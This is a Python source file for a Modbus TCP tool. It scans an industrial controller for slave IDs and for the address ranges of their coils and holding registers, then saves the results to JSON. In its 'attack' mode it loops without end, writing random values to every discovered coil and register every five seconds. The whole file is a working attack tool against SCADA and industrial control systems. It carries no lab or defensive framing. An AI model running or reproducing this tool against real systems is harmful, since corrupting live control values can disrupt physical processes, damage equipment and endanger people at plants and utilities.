import json
import argparse
import random
import time

import scada.modbus_tk.modbus_tcp as modbus_tcp


def write_json(data, file_name):
    with open(file_name, "w") as file:
        json.dump(data, file, indent=4)


def load_json(file_name):
    with open(file_name, "r") as file:
        return json.load(file)


class ModbusScan:
    def __init__(self, ip: str, port: int):
        self.ip = ip
        self.port = port
        self.master = modbus_tcp.TcpMaster(host=self.ip, port=self.port)
        self.master.set_timeout(1.0)
        self.output_file = None
        self.slave_list = list()

    block_types = {
        1: "COILS",
        2: "DISCRETE_INPUTS",
        3: "HOLDING_REGISTERS",
        4: "ANALOG_INPUTS",
    }

    def __find_id_slaves(self):
        slave_list = list()
        for id_value in range(1, 248):
            try:
                _ = self.master.execute(
                    slave=id_value,
                    function_code=1,
                    starting_address=0,
                    quantity_of_x=1
                )
            except Exception as ex:
                if ex.args[0] == 2:
                    slave_list.append(id_value)
        return slave_list

    def __check_block(self, id_value, func, address, quantity_of_x=1):
        try:
            _ = self.master.execute(
                slave=id_value,
                function_code=func,
                starting_address=address,
                quantity_of_x=quantity_of_x
            )
        except Exception:
            return quantity_of_x - 1
        else:
            return self.__check_block(
                id_value,
                func,
                address,
                quantity_of_x + 1
            )

    def find_all_slaves(self, address_range):
        print("Started searching for slave ids...")
        slave_ids_list = self.__find_id_slaves()
        print("Done!")
        for id_value in slave_ids_list:
            print("Started searching for addresses"
                  f" of slave {id_value} blocks...")
            slave_data = {"id": id_value, "blocks": []}
            for func in self.block_types.keys():
                address = address_range[0]
                while address < address_range[1]:
                    quantity_of_x = self.__check_block(id_value, func, address)
                    if quantity_of_x:
                        slave_data["blocks"].append(
                            {
                                "type": self.block_types[func],
                                "starting_address": address,
                                "size": quantity_of_x
                            }
                        )
                        address += quantity_of_x
                        continue
                    address += 1

            print("Done!")
            self.slave_list.append(slave_data)

        write_json(self.slave_list, self.output_file)


class ModbusAttack(ModbusScan):
    def __init__(self, ip, port, file_name=None):
        super().__init__(ip, port)
        self.file_name = file_name

    def modbus_attack(self):
        if self.file_name:
            self.slave_list = load_json(self.file_name)
        else:
            self.find_all_slaves((0, 2 ** 16))
        print("Started an endless attack...")
        while True:
            self.master.open()
            for slave in self.slave_list:
                for block in slave["blocks"]:
                    if block["type"] == "HOLDING_REGISTERS":
                        self.master.execute(
                            slave=slave["id"],
                            function_code=16,
                            starting_address=block["starting_address"],
                            output_value=[
                                random.randint(0, 1) for _ in range(
                                    0,
                                    block["size"]
                                )
                            ],
                        )
                    elif block["type"] == "COILS":
                        self.master.execute(
                            slave=slave["id"],
                            function_code=15,
                            starting_address=block["starting_address"],
                            output_value=[
                                random.randint(0, 1) for _ in range(
                                    0,
                                    block["size"]
                                )
                            ],
                        )
            self.master.close()
            time.sleep(5)


def args_pars():
    parser = argparse.ArgumentParser()

    parser.add_argument(
        "-o", "--output",
        help="The resulting output file for the scrape",
        dest="output", type=str, default="slaves.json"
    )

    parser.add_argument(
        "-f", "--file",
        help="The file with slave data to attack",
        dest="file", type=str, default="slaves.json"
    )

    parser.add_argument(
        "-p", "--port",
        help="The port to connect to",
        dest="port", type=int, default=502
    )

    parser.add_argument(
        "-i", "--ip",
        help="The server ip to scrape",
        dest="ip", type=str, required=True
    )

    parser.add_argument(
        "-r", "--range",
        help="The address range to scan",
        dest="query",  type=str, default=f"0:{2**16}"
    )

    parser.add_argument(
        "-a", "--attack",
        help="The operation mode 'attack'",
        dest="attack",
        action='store_true'
    )

    parser.add_argument(
        "-s", "--scrape",
        help="The operation mode 'scan'",
        dest="scrape",
        action='store_true'
    )

    return parser.parse_args()


def main():
    args = args_pars()
    if args.attack:
        if args.file:
            modbus_server = ModbusAttack(args.ip, args.port, args.file)
            modbus_server.modbus_attack()
        else:
            modbus_server = ModbusAttack(args.ip, args.port)
            modbus_server.modbus_attack()
    else:
        modbus_server = ModbusScan(args.ip, args.port)
        modbus_server.output_file = args.output
        query = (int(i) for i in args.query.split(":"))
        modbus_server.find_all_slaves(tuple(query))


if __name__ == '__main__':
    main()

